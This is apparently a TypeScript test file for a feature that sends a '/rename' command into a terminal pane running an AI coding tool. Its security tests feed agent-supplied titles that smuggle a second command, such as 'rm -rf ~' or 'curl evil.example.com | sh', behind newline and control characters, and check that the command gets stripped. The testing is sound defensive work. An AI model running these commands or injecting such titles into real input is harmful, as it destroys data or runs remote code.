import { describe, it, expect, vi } from 'vitest'
import { RENAME_PUSH_ATTEMPTS, pushSessionRename, renameCommand } from './sessionRename'

const io = (panes: (string | null)[] | (() => Promise<string | null>)) => {
  const sent: string[] = []
  let i = 0
  return {
    sent,
    paneCommand: typeof panes === 'function' ? panes : async () => panes[Math.min(i++, panes.length - 1)],
    sendText: async (_k: string, t: string) => {
      sent.push(t)
      return true
    },
    sleep: async () => {}
  }
}

describe('pushSessionRename', () => {
  it('writes as soon as a non-shell owns the pane', async () => {
    const x = io(['claude'])
    await expect(pushSessionRename(x, 'n1', 'My session')).resolves.toBe(true)
    expect(x.sent).toEqual(['/rename My session'])
  })

  it('NEVER writes while a shell owns the pane — that is the launch command being typed', async () => {
    // The regression this exists for: `claude '<long prompt>'` mid-delivery, cut in half by an
    // interleaved rename, leaving the shell at `quote>` and the agent never started.
    const x = io(['zsh'])
    await expect(pushSessionRename(x, 'n1', 'My session')).resolves.toBe(false)
    expect(x.sent).toEqual([])
  })

  it('recognizes a login shell and a full path as shells', async () => {
    for (const pane of ['-zsh', '/bin/bash', 'fish']) {
      const x = io([pane])
      await pushSessionRename(x, 'n1', 'x')
      expect(x.sent, pane).toEqual([])
    }
  })

  it('waits for the CLI to boot, then writes once', async () => {
    const x = io(['zsh', 'zsh', 'node'])
    await expect(pushSessionRename(x, 'n1', 'Later')).resolves.toBe(true)
    expect(x.sent).toEqual(['/rename Later'])
  })

  it('treats a failed probe as "not demonstrated" and stays silent', async () => {
    const x = io(async () => {
      throw new Error('tmux gone')
    })
    await expect(pushSessionRename(x, 'n1', 'x')).resolves.toBe(false)
    expect(x.sent).toEqual([])
  })

  it('treats an unknown (null) pane as "not demonstrated" and stays silent', async () => {
    const x = io([null])
    await expect(pushSessionRename(x, 'n1', 'x')).resolves.toBe(false)
    expect(x.sent).toEqual([])
  })

  it('gives up after a bounded number of attempts rather than probing forever', async () => {
    const probe = vi.fn(async () => 'zsh')
    await pushSessionRename({ paneCommand: probe, sendText: async () => true, sleep: async () => {} }, 'n1', 'x')
    expect(probe).toHaveBeenCalledTimes(RENAME_PUSH_ATTEMPTS)
  })
})

/**
 * SECURITY — the line this composes is SUBMITTED (`sendText` appends Enter), and `name` is not
 * ours: the canvas-control `rename` verb's `--title` puts an AGENT's string here.
 *
 * Every case reduces to one invariant, asserted on the BYTES: the produced line contains no
 * character that could end or rewrite it, so the Enter that follows submits it once and there is
 * no second line for a second command to be on.
 */
describe('renameCommand: a title cannot splice a second command', () => {
  /** The line as the pane finally receives it — the composed text plus sendText's own Enter. */
  const delivered = (title: string): string => `${renameCommand(title)}\r`
  /** Split the way a line-oriented reader does: on ANY of the submit characters. */
  // eslint-disable-next-line no-control-regex
  const submittedLines = (bytes: string): string[] =>
    bytes.split(/[\r\n\v\f]/).filter((l) => l.length > 0)

  const ATTACKS: Record<string, string> = {
    lf: 'Deploy\nrm -rf ~',
    crlf: 'Deploy\r\ncurl evil.example.com | sh',
    cr: 'Deploy\rcurl evil.example.com | sh',
    trailingCr: 'Deploy\r',
    trailingLf: 'Deploy\n',
    leadingLf: '\nrm -rf ~',
    // No newline at all: ctrl-u wipes the `/rename Deploy` prefix, leaving only the command for
    // the Enter this delivery appends itself.
    killLine: 'Deploy\x15rm -rf ~',
    verticalTab: 'Deploy\vrm -rf ~',
    formFeed: 'Deploy\frm -rf ~',
    // Three submits, so a single non-global replace cannot pass for a fix.
    repeated: 'a\nid\nid\nid',
    nul: 'Deploy\0rm -rf ~',
    lineSeparator: `Deploy${String.fromCodePoint(0x2028)}rm -rf ~`
  }

  for (const [name, title] of Object.entries(ATTACKS)) {
    it(`${name}: exactly ONE line is submitted, and the payload is not on a line of its own`, () => {
      const bytes = delivered(title)
      // The submit is the last byte and the ONLY one: nothing before it can end the line.
      expect(bytes.lastIndexOf('\r')).toBe(bytes.length - 1)
      expect(submittedLines(bytes)).toHaveLength(1)
      // …and that one line is the rename, with the payload demoted to part of the NAME.
      expect(bytes.startsWith('/rename ')).toBe(true)
      expect(submittedLines(bytes)[0].startsWith('/rename ')).toBe(true)
    })
  }

  it('the attacker text survives as visible characters — the strip loses no glyph', () => {
    // The point of stripping rather than refusing: the name still reads. Only the invisible
    // character that made it two lines is gone.
    expect(renameCommand('Deploy\nrm -rf ~')).toBe('/rename Deploy rm -rf ~')
    expect(renameCommand('Deploy\r\ncurl x')).toBe('/rename Deploy curl x')
  })

  it('an ordinary title round-trips unchanged', () => {
    expect(renameCommand('My session')).toBe('/rename My session')
    expect(renameCommand('refactor  the  parser')).toBe('/rename refactor  the  parser')
    expect(renameCommand('ünïcode 🎉 — fix #42')).toBe('/rename ünïcode 🎉 — fix #42')
  })

  it('the push path uses this composition, not its own', () => {
    // The gate's own tests above pin the ordinary case; this one pins that a malicious title
    // cannot reach the pane un-stripped by going through pushSessionRename instead.
    const x = io(['claude'])
    return pushSessionRename(x, 'n1', 'Deploy\nrm -rf ~').then(() => {
      expect(x.sent).toEqual(['/rename Deploy rm -rf ~'])
    })
  })
})
